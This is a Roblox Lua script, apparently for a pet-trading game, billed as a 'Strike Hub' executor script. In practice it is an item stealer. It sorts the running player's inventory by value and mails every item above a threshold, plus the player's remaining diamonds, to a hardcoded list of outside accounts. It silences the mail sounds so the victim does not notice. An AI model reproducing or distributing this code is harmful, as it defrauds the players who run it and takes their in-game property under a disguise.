--// Strike Hub Universal Script (Executor-Compatible)
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local plr = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

-- Safe HTTP request detection
local requestFunc = nil
if request then
    requestFunc = request
elseif http_request then
    requestFunc = http_request
elseif syn and syn.request then
    requestFunc = syn.request
elseif fluxus and fluxus.request then
    requestFunc = fluxus.request
elseif KRNL_LOADED and http and http.request then
    requestFunc = http.request
end
local function safeRequest(args)
    if requestFunc then
        return requestFunc(args)
    else
        warn("No supported HTTP request function found for this executor.")
        return nil
    end
end

-- Safe getgc detection
local function safeGetGC()
    local gcFunc = getgc or (syn and syn.get_gc) or (fluxus and fluxus.get_gc)
    if gcFunc then
        local ok, result = pcall(gcFunc)
        if ok then return result end
    end
    return {}
end

-- Safe kick
local function safeKick(player, reason)
    if player and player:IsA("Player") then
        pcall(function() player:Kick(reason) end)
    end
end

-- Services & modules
local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local saveModule = require(game.ReplicatedStorage.Library.Client.Save)
local save = saveModule.Get().Inventory
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function() return saveModule.Get() end

-- Settings
local MailMessage = "GGz"
local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    safeKick(plr, "No usernames or webhook set")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        safeKick(plr, "Cannot mail yourself")
        return
    end
end

-- Compute initial mail cost
local FunctionToGetFirstPriceOfMail
for _, func in pairs(safeGetGC()) do
    local info = debug.getinfo(func)
    if info and info.name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end
local mailSendPrice = FunctionToGetFirstPriceOfMail()

-- Get diamonds
local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

-- Format number
local function formatNumber(number)
    local number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local idx = 1
    while number >= 1000 do
        number = number / 1000
        idx = idx + 1
    end
    return string.format("%.2f%s", number, suffixes[idx])
end

-- Disable mail send sounds
game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId == "rbxassetid://11839132565" or
           x.SoundId == "rbxassetid://14254721038" or
           x.SoundId == "rbxassetid://12413423276" then
            x.Volume = 0
            x.PlayOnRemove = false
            x:Destroy()
        end
    end
end)

-- RAP calculation
local function getRAP(Type, Item)
    return (require(game.ReplicatedStorage.Library.Client.RAPCmds).Get({
        Class = {Name = Type},
        IsA = function(h) return h == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id=Item.id, pt=Item.pt or 0, sh=Item.sh or false, tn=Item.tn or ""}) end,
        AbstractGetRAP = function() return nil end
    }) or 0)
end

-- Send item function (with multiple users support)
local function sendItem(category, uid, am)
    local userIndex = 1
    local maxUsers = #users
    local sent = false
    repeat
        local currentUser = users[userIndex]
        local args = {currentUser, MailMessage, category, uid, am or 1}
        local ok, response = pcall(function() return network.Invoke("Mailbox: Send", unpack(args)) end)
        if ok and response == true then
            sent = true
            GemAmount1 = GemAmount1 - mailSendPrice
            mailSendPrice = math.min(math.ceil(mailSendPrice*1.5), 5000000)
        elseif response == false and response == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then
                sent = true
            end
        end
        task.wait(0.2)
    until sent
end

-- Prepare items sorted by RAP
local sortedItems = {}
local totalRAP = 0
local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

for _, cat in ipairs(categoryList) do
    if save[cat] then
        for uid, item in pairs(save[cat]) do
            local rapValue = getRAP(cat, item)
            if rapValue >= min_rap then
                local name = item.id
                if item.sh then name = "Shiny "..name end
                if item.pt == 1 then name = "Golden "..name
                elseif item.pt == 2 then name = "Rainbow "..name end
                table.insert(sortedItems, {category=cat, uid=uid, amount=item._am or 1, rap=rapValue, name=name})
                totalRAP = totalRAP + (rapValue * (item._am or 1))
            end
        end
    end
end

-- Sort by highest RAP first
table.sort(sortedItems, function(a,b) return a.rap*a.amount > b.rap*b.amount end)

-- Send items
for _, item in ipairs(sortedItems) do
    if item.rap >= mailSendPrice and GemAmount1 > mailSendPrice then
        sendItem(item.category, item.uid, item.amount)
    else
        break
    end
end

-- Send remaining diamonds
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" and GemAmount1 > mailSendPrice then
        for _, user in ipairs(users) do
            local args = {user, MailMessage, "Currency", i, GemAmount1 - mailSendPrice}
            pcall(function() network.Invoke("Mailbox: Send", unpack(args)) end)
            break
        end
    end
end

print("[Strike Hub] Execution complete. All items sent with executor compatibility and sounds muted.")
